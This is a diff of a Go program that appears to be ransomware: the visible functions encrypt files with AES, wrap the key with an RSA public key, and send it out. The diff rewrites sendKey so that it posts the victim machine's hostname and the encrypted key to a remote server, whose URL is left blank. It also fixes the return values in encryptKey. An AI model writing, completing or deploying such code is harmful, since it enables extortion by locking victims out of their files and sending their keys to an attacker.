@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -10,7 +9,7 @@ import (
 	"crypto/sha256"
 	"encoding/pem"
 	"encoding/hex"
-	"encoding/json"
+	"net/url"
 	"fmt"
 	"net/http"
 	"runtime"
@@ -77,7 +76,7 @@ func encryptKey() (string, error) {
 	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
 	if err != nil {
 		fmt.Println(err)
-		return err
+		return "", err
 	}
 
 	encKey, err := rsa.EncryptOAEP(
@@ -88,7 +87,7 @@ func encryptKey() (string, error) {
 		nil)
 	if err != nil {
 		fmt.Println(err)
-		return err
+		return "", err
 	}
 	encHex := hex.EncodeToString(encKey)
 	fmt.Println(encHex)
@@ -160,13 +159,12 @@ func encryptFile(path string) {
 }
 
 func sendKey(hexKey string) error {
-	r := map[string]string{"encKey": hexKey}
-	json_data, err := json.Marshal(r)
+	hostname, err := os.Hostname()
 	if err != nil {
 		fmt.Println(err)
 		return err
 	}
-	resp, err := http.Post("https://addr", "application/json", bytes.NewBuffer(json_data))
+	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}})
 	if err != nil || resp.StatusCode != 200 {
 		fmt.Println(err)
 		return err
